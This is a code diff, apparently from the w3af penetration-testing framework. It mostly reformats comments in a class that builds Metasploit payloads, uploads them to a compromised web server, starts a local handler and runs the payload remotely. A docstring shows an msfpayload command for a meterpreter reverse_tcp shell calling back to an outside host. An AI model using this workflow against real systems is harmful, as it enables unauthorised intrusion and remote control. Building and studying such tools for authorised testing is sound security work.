@@ -35,19 +35,20 @@ from w3af.core.controllers.intrusion_tools.execMethodHelpers import get_remote_t
 
 class vdaemon(object):
     """
-    This class represents a virtual daemon that will run metasploit's msfpayload, create an
-    executable file, upload it to the remote server, run the payload handler locally and
-    finally execute the payload in the remote server.
+    This class represents a virtual daemon that will run metasploit's
+    msfpayload, create an executable file, upload it to the remote server, run
+    the payload handler locally and finally execute the payload in the remote
+    server.
 
-    This class should be sub-classed by winVd and lnxVd, each implementing a different way
-    of sending the metasploit payload to the remote web server.
+    This class should be sub-classed by winVd and lnxVd, each implementing a
+    different way of sending the metasploit payload to the remote web server.
 
     :author: Andres Riancho (andres.riancho@gmail.com)
     """
     def __init__(self, exec_method):
 
-        # This is the method that will be used to send the metasploit payload to the
-        # remote webserver ( using echo $payload > file )
+        # This is the method that will be used to send the metasploit payload to
+        # the remote webserver ( using echo $payload > file )
         self._exec_method = exec_method
 
         self._metasploit_location = cf.cf.get('msf_location')
@@ -67,7 +68,8 @@ class vdaemon(object):
         """
 
         #
-        #    We follow the same order as MSF, but we only allow the user to generate executable files
+        # We follow the same order as MSF, but we only allow the user to
+        # generate executable files
         #
         #    Usage: /opt/metasploit3/msf3/msfpayload <payload> [var=val] ...
         #
@@ -96,8 +98,8 @@ class vdaemon(object):
         msfcli_parameters = msfcli_parameters[1:]
 
         try:
-            executable_file_name = self._generate_exe(
-                payload, msfpayload_parameters)
+            executable_file_name = self._generate_exe(payload,
+                                                      msfpayload_parameters)
         except Exception, e:
             raise w3afException(
                 'Failed to create the payload file, error: "%s".' % str(e))
@@ -105,25 +107,25 @@ class vdaemon(object):
         try:
             remote_file_location = self._send_exe_to_server(
                 executable_file_name)
-        except Exception, e:
-            raise w3afException(
-                'Failed to send the payload file, error: "%s".' % str(e))
+        except w3afException, e:
+            error_msg = 'Failed to send the payload file, error: "%s".'
+            raise w3afException(error_msg % e)
         else:
-            om.out.console('Successfully transfered the MSF payload to the remote server.')
+            om.out.console('Successfully transfered the MSF payload to the'
+                           ' remote server.')
 
             #
-            #    Good, the file is there, now we launch the local listener and then we execute
-            #    the remote payload
+            #    Good, the file is there, now we launch the local listener and
+            #    then we execute the remote payload
             #
-
             if not self._start_local_listener(msfcli_handler, msfcli_parameters):
-                om.out.console(
-                    'Failed to start the local listener for "%s"' % payload)
+                error_msg = 'Failed to start the local listener for "%s"'
+                om.out.console(error_msg % payload)
             else:
                 try:
                     self._exec_payload(remote_file_location)
                 except Exception, e:
-                    raise w3afException('Failed to execute the executable file on the server, error: ' + str(e))
+                    raise w3afException('Failed to execute the executable file on the server, error: %s' % e)
                 else:
                     om.out.console('Successfully executed the MSF payload on the remote server.')
 
@@ -137,8 +139,8 @@ class vdaemon(object):
 
         :return: True if it was possible to start the listener in a new console
         """
-        msfcli_command = '%s %s %s' % (
-            self._msfcli_path, msfcli_handler, ' '.join(parameters))
+        args = (self._msfcli_path, msfcli_handler, ' '.join(parameters))
+        msfcli_command = '%s %s %s' % args
         om.out.console('Running a new terminal with the payload handler ("%s")' % msfcli_command)
 
         # TODO: Add support for KDE, Windows, etc.
@@ -152,8 +154,9 @@ class vdaemon(object):
 
     def _generate_exe(self, payload, parameters):
         """
-        This method should be implemented according to the remote operating system. The idea here
-        is to generate an ELF/PE file and return a string that represents it.
+        This method should be implemented according to the remote operating
+        system. The idea here is to generate an ELF/PE file and return a string
+        that represents it.
 
         The method will basically run something like:
         msfpayload linux/x86/meterpreter/reverse_tcp LHOST=1.2.3.4 LPORT=8443 X > /tmp/output2.exe
@@ -189,8 +192,9 @@ class vdaemon(object):
 
     def _send_exe_to_server(self, exe_file):
         """
-        This method should be implemented according to the remote operating system. The idea here is to
-        send the exe_file to the remote server and save it in a file.
+        This method should be implemented according to the remote operating
+        system. The idea here is to send the exe_file to the remote server and
+        save it in a file.
 
         :param exe_file: The local path to the executable file
         :return: The name of the remote file that was uploaded.
@@ -206,10 +210,11 @@ class vdaemon(object):
         transferHandler = ptf.get_transfer_handler()
 
         if not transferHandler.can_transfer():
-            raise w3afException('Can\'t transfer the file to remote host, can_transfer() returned False.')
+            raise w3afException('Can\'t transfer the file to remote host,'
+                                ' can_transfer() returned False.')
         else:
-            om.out.debug(
-                'The transferHandler can upload files to the remote end.')
+            om.out.debug('The transferHandler can upload files to the remote'
+                         ' end.')
 
             estimatedTime = transferHandler.estimate_transfer_time(
                 len(exe_file))
@@ -230,9 +235,10 @@ class vdaemon(object):
 
     def _exec_payload(self, remote_file_location):
         """
-        This method should be implemented according to the remote operating system. The idea here is to
-        execute the payload that was sent using _send_exe_to_server and generated by _generate_exe . In lnxVd
-        I should run "chmod +x file; ./file"
+        This method should be implemented according to the remote operating
+        system. The idea here is to execute the payload that was sent using
+        _send_exe_to_server and generated by _generate_exe . In lnxVd I should
+        run "chmod +x file; ./file"
 
         This method should be implemented in winVd and lnxVd.
         """
